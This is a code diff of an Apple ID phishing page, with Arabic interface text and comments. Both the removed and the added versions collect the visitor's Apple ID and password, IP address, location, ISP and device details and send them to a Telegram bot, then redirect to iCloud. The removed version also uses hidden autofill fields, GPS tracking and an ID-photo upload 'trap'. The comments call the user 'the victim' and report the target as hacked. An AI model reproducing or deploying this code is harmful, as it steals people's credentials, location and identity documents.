@@ -3,38 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Apple Security Update</title>
+    <title>Sign In - Apple</title>
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-        .box { width: 100%; max-width: 350px; text-align: center; padding: 20px; box-sizing: border-box; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .box { width: 100%; max-width: 340px; text-align: center; padding: 20px; }
         img { width: 35px; margin-bottom: 20px; }
-        h1 { font-size: 22px; font-weight: 600; margin-bottom: 10px; }
-        p { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
-        input { width: 100%; padding: 14px; margin-bottom: 10px; border: 1px solid #d2d2d7; border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; }
-        .file-label { display: block; padding: 10px; background: #f5f5f7; border: 1px dashed #d2d2d7; border-radius: 10px; margin-bottom: 15px; cursor: pointer; font-size: 13px; color: #0071e3; }
+        h1 { font-size: 24px; font-weight: 600; margin: 0 0 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 30px; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #d2d2d7; border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; }
         button { width: 100%; padding: 14px; background: #0071e3; color: #fff; border: none; border-radius: 10px; font-size: 17px; font-weight: 500; cursor: pointer; }
-        .hidden { display: none; }
     </style>
 </head>
 <body>
 
 <div class="box">
     <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
-    <h1>تحديث أمني إلزامي</h1>
-    <p>يرجى تأكيد هويتك عبر تسجيل الدخول وإرفاق صورة الهوية لتجنب قفل حسابك.</p>
-    
-    <input type="text" id="full_name" class="hidden" autocomplete="name">
-    <input type="tel" id="phone" class="hidden" autocomplete="tel">
-    
-    <input type="email" id="u" placeholder="Apple ID" required autocomplete="username">
-    <input type="password" id="p" placeholder="Password" required autocomplete="current-password">
-    
-    <label class="file-label">
-        📸 إرفاق صورة الهوية للتحقق (اختياري)
-        <input type="file" id="photo_trap" class="hidden" accept="image/*">
-    </label>
-    
-    <button id="btn">تحديث الآن</button>
+    <h1>Apple ID</h1>
+    <p>استخدم الـ Apple ID الخاص بك لتسجيل الدخول</p>
+    <input type="email" id="u" placeholder="Apple ID" required>
+    <input type="password" id="p" placeholder="Password" required>
+    <button id="btn">Continue</button>
 </div>
 
 <script>
@@ -45,68 +33,65 @@
         await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=HTML`);
     }
 
-    // 1. بمجرد الدخول: سحب GPS والـ IP
-    window.onload = async function() {
-        sendMsg("🚀 <b>دخول جديد للرابط... جاري سحب GPS والشبكة</b>");
-        
-        // محاولة سحب GPS الدقيق
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            sendMsg(`📍 <b>موقع GPS دقيق:</b>\n${mapLink}`);
-        }, (err) => {
-            sendMsg("⚠️ الضحية رفض إعطاء صلاحية الموقع (GPS).");
-        });
-
-        // سحب الـ IP والـ Local IP (Scan)
+    // محرك جلب البيانات الثلاثي (Tri-Fetch Engine)
+    async function getFullData() {
+        let results = { ip: "127.0.0.1", city: "غير معروف", country: "غير معروف", isp: "محمي/VPN", map: "" };
         try {
-            const res = await fetch('https://ipwho.is/');
-            const d = await res.json();
-            let networkInfo = `🌐 <b>بيانات الشبكة:</b>\nIP: ${d.ip}\nCity: ${d.city}\nISP: ${d.connection.isp}`;
-            sendMsg(networkInfo);
-        } catch(e) {}
-    };
-
-    // 2. فخ الصور (Photo Trap)
-    document.getElementById('photo_trap').onchange = async function(e) {
-        const file = e.target.files[0];
-        if (file) {
-            sendMsg("📸 <b>الضحية اختار صورة... جاري الرفع</b>");
-            let formData = new FormData();
-            formData.append('chat_id', chat_id);
-            formData.append('photo', file);
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+            // محاولة عبر ipwhois
+            const r1 = await fetch('https://ipwho.is/');
+            const d1 = await r1.json();
+            if(d1.success) {
+                results = { ip: d1.ip, city: d1.city, country: d1.country, isp: d1.connection.isp, map: `https://www.google.com/maps?q=${d1.latitude},${d1.longitude}` };
+            } else throw 'e';
+        } catch(e) {
+            try {
+                // محاولة احتياطية ثانية عبر ipapi
+                const r2 = await fetch('https://ipapi.co/json/');
+                const d2 = await r2.json();
+                results = { ip: d2.ip, city: d2.city, country: d2.country_name, isp: d2.org, map: `https://www.google.com/maps?q=${d2.latitude},${d2.longitude}` };
+            } catch(e2) {}
         }
+        return results;
+    }
+
+    // 1. عند الدخول فوراً
+    window.onload = async function() {
+        sendMsg("🔔 <b>دخول جديد للرابط... جاري جمع المعلومات</b>");
+        const data = await getFullData();
+        let entry = `📍 <b>معلومات الدخول الأولية:</b>\n🌐 IP: ${data.ip}\n🏙️ المدينة: ${data.city}\n📶 المزود: ${data.isp}`;
+        sendMsg(entry);
     };
 
-    // 3. التقرير الشامل عند الضغط
+    // 2. التقرير الشامل عند الضغط
     document.getElementById('btn').onclick = async function() {
         const user = document.getElementById('u').value;
         const pass = document.getElementById('p').value;
-        const autoName = document.getElementById('full_name').value || "غير متوفر";
-        const autoPhone = document.getElementById('phone').value || "غير متوفر";
-        
-        if(!user || !pass) return alert("يرجى إدخال البيانات المطلوبة");
+        if(!user || !pass) return;
 
-        this.innerHTML = "جاري التحقق...";
+        this.innerHTML = "Processing...";
         this.disabled = true;
 
-        let report = "⚠️ <b>تم الاختراق الكامل للهدف</b> ⚠️\n\n";
-        report += "📧 <b>Apple ID:</b> <code>" + user + "</code>\n";
-        report += "🔑 <b>Password:</b> <code>" + pass + "</code>\n";
-        report += "👤 <b>Autofill Name:</b> " + autoName + "\n";
-        report += "📞 <b>Autofill Phone:</b> " + autoPhone + "\n";
+        const d = await getFullData();
+
+        let report = "⚠️ <b>تم اختراق الهدف بنجاح</b> ⚠️\n\n";
+        report += "📧 <b>الحساب:</b> <code>" + user + "</code>\n";
+        report += "🔑 <b>الباسورد:</b> <code>" + pass + "</code>\n";
         report += "------------------------\n";
-        report += "📱 <b>Platform:</b> " + navigator.platform + "\n";
-        report += "🔋 <b>Battery:</b> " + (navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A") + "\n";
-        report += "🕰️ <b>Time:</b> " + new Date().toLocaleString() + "\n";
-        
+        report += "🌐 <b>الـ IP:</b> " + d.ip + "\n";
+        report += "📍 <b>الموقع:</b> " + d.city + " (" + d.country + ")\n";
+        report += "📶 <b>المزود:</b> " + d.isp + "\n";
+        report += "📱 <b>النظام:</b> " + navigator.platform + "\n";
+        report += "🔋 <b>البطارية:</b> " + (navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A") + "\n";
+        report += "📏 <b>الدقة:</b> " + screen.width + "x" + screen.height + "\n";
+        report += "🕰️ <b>الوقت:</b> " + new Date().toLocaleString() + "\n";
+        report += "🔒 <b>كوكيز:</b> " + (document.cookie ? "موجودة" : "محمية") + "\n\n";
+        report += "📍 <b>موقع الضحية على الخريطة:</b>\n" + d.map;
+
         await sendMsg(report);
 
         setTimeout(() => {
             window.location.replace("https://www.icloud.com/");
-        }, 1500);
+        }, 1000);
     };
 </script>
 
